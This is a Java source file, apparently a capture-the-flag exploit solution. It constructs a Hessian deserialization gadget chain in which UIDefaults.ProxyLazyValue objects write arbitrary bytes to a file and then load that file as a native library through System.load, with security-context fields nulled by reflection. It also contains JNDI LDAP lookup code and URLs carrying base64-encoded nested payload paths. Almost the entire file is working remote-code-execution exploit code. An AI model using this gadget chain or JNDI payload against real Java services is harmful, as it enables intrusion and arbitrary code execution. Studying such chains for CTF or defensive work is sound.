package solution;

import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.SerializerFactory;
import tools.HessianTools;
import tools.ReflectTools;

import java.io.ByteArrayOutputStream;
import java.lang.reflect.Method;
import java.util.HashMap;

import javax.naming.InitialContext;
import javax.naming.directory.DirContext;
import javax.swing.*;

public class Exp {
    public static void main(String[] args) throws Exception {
        String jndiUrl = "ldap://127.0.0.1:1389/Vibur/Databricks/JNDI/bGRhcDovLzEyNy4wLjAuMToxMzg5L0hlc3NpYW4vamF2YXgubmFtaW5nLmRpcmVjdG9yeS5EaXJDb250ZXh0L0xvYWRMaWJyYXJ5L1pIbHVZVzFwWXk1a2JHdz0=";
        String hessianUrl = "ldap://127.0.0.1:1389/Hessian/javax.naming.directory.DirContext/LoadLibrary/ZHluYW1pYy5kbGw=";
        InitialContext initialContext = new InitialContext();
        DirContext lookup = (DirContext) initialContext.lookup("ldap://127.0.0.1:1379/any");
//        NamingEnumeration<SearchResult> aaa = lookup.search("aaa", new Attributes() {
//            @Override
//            public boolean isCaseIgnored() {
//                return false;
//            }
//
//            @Override
//            public int size() {
//                return 0;
//            }
//
//            @Override
//            public Attribute get(String attrID) {
//                return null;
//            }
//
//            @Override
//            public NamingEnumeration<? extends Attribute> getAll() {
//                return null;
//            }
//
//            @Override
//            public NamingEnumeration<String> getIDs() {
//                return null;
//            }
//
//            @Override
//            public Attribute put(String attrID, Object val) {
//                return null;
//            }
//
//            @Override
//            public Attribute put(Attribute attr) {
//                return null;
//            }
//
//            @Override
//            public Attribute remove(String attrID) {
//                return null;
//            }
//
//            @Override
//            public Object clone() {
//                return null;
//            }
//        });
    }

    public static Object writeFilePayload(String fileName, byte[] content) throws Exception {
        UIDefaults.ProxyLazyValue proxyLazyValue1 = new UIDefaults.ProxyLazyValue("com.sun.org.apache.xml.internal.security.utils.JavaUtils", "writeBytesToFilename", new Object[]{fileName, content});
        UIDefaults.ProxyLazyValue proxyLazyValue2 = new UIDefaults.ProxyLazyValue("java.lang.System", "load", new Object[]{fileName});

        ReflectTools.setFieldValue(proxyLazyValue1, "acc", null);
        ReflectTools.setFieldValue(proxyLazyValue2, "acc", null);

        UIDefaults u1 = new UIDefaults();
        UIDefaults u2 = new UIDefaults();
        u1.put("aaa", proxyLazyValue1);
        u2.put("aaa", proxyLazyValue1);

        HashMap map1 = ReflectTools.makeMap1(u1, u2);

        UIDefaults u3 = new UIDefaults();
        UIDefaults u4 = new UIDefaults();
        u3.put("bbb", proxyLazyValue2);
        u4.put("bbb", proxyLazyValue2);

        HashMap map2 = ReflectTools.makeMap1(u3, u4);

        HashMap map = new HashMap();
        map.put(1, map1);
        map.put(2, map2);



        return HessianTools.hessianSer2bytes(map, "2");
    }

}
